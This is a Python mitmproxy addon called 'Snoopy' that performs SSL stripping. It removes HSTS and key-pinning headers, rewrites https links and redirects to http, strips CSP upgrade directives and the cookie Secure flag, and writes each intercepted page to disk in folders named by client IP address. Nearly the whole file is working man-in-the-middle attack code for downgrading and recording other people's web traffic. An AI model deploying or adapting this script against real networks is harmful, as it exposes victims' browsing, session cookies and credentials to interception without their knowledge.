"""
Log everything, except HLTV, which gets its own file?
"""

import re
import urllib.parse

from mitmproxy import http

import mitmproxy


import os

# set of SSL/TLS capable hosts
secure_hosts: set[str] = set()

class Snoopy:
    def __init__(self):
        self.server_name = None
        self.client_addr = None

        self.counter = 0



    def server_connect(self, data: mitmproxy.proxy.server_hooks.ServerConnectionHookData):
        print("About to connect to a server ==============")
        print("server", data.server.address[0])
        # print(dir(data.client))
        print("client", data.client.address[0] + ":" + str(data.client.address[1]))

        self.server_name = data.server.address[0]
        self.client_name = data.client.address[0] + ":" + str(data.client.address[1])

        self.counter += 1
        print(self.counter)




    def request(self, flow: http.HTTPFlow) -> None:

        # do not force https redirection
        flow.request.headers.pop("Upgrade-Insecure-Requests", None)

        flow.request.headers.pop("If-Modified-Since", None)
        flow.request.headers.pop("Cache-Control", None)

        # proxy connections to SSL-enabled hosts (FROM HERE!!)
        if flow.request.pretty_host in secure_hosts:
            flow.request.scheme = "https"
            flow.request.port = 443

            flow.request.host = flow.request.pretty_host


        # print(flow.request.pretty_host + flow.request.path)
        # print(flow.request.content.decode()) # Okay happy now?
        # print("Buh")

        print("Request thru")
        print(self.server_name, flow.request.pretty_host + flow.request.path)

        # print(secure_hosts)




    def response(self, flow: http.HTTPFlow) -> None:
        assert flow.response


        flow.response.headers.pop("Strict-Transport-Security", None)
        flow.response.headers.pop("Public-Key-Pins", None)

        # strip links in response body
        flow.response.content = flow.response.content.replace(b"https://", b"http://")
        # flow.response.content = flow.response.content.replace(b":443", b"")

        # strip meta tag upgrade-insecure-requests in response body
        csp_meta_tag_pattern = rb'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
        flow.response.content = re.sub(
            csp_meta_tag_pattern, b"", flow.response.content, flags=re.IGNORECASE
        )

        # strip links in 'Location' header
        if flow.response.headers.get("Location", "").startswith("https://"):
            location = flow.response.headers["Location"]
            hostname = urllib.parse.urlparse(location).hostname
            if hostname:
                secure_hosts.add(hostname)
            flow.response.headers["Location"] = location.replace("https://", "http://", 1)

        # strip upgrade-insecure-requests in Content-Security-Policy header
        csp_header = flow.response.headers.get("Content-Security-Policy", "")
        if re.search("upgrade-insecure-requests", csp_header, flags=re.IGNORECASE):
            csp = flow.response.headers["Content-Security-Policy"]
            new_header = re.sub(
                r"upgrade-insecure-requests[;\s]*", "", csp, flags=re.IGNORECASE
            )
            flow.response.headers["Content-Security-Policy"] = new_header

        # strip secure flag from 'Set-Cookie' headers
        cookies = flow.response.headers.get_all("Set-Cookie")
        cookies = [re.sub(r";\s*secure\s*", "", s) for s in cookies]
        flow.response.headers.set_all("Set-Cookie", cookies)




        if flow.response.status_code == 200:
            print("Response thru")
            print(self.server_name, flow.request.pretty_host)



        # Stuff
        # print("SPAM")
        # print(flow.response.content)
        if flow.response.status_code == 200:
            # print(dir(flow.response))
            # print(flow.response.timestamp_start)
            # print(flow.rserveresponse.json)

            print("client", flow.client_conn.address[0])

            dir_path = "./saves/" + str(flow.client_conn.address[0])
            filename = flow.request.pretty_host + "-" + str(flow.response.timestamp_start)
            file_path = dir_path + '/' + filename + '.html'

            if not os.path.exists(dir_path):
                os.makedirs(dir_path)

            with open(file_path, 'a') as file:
                data = flow.response.content.decode()
                file.write(data)
                file.flush()


addons = [Snoopy()]
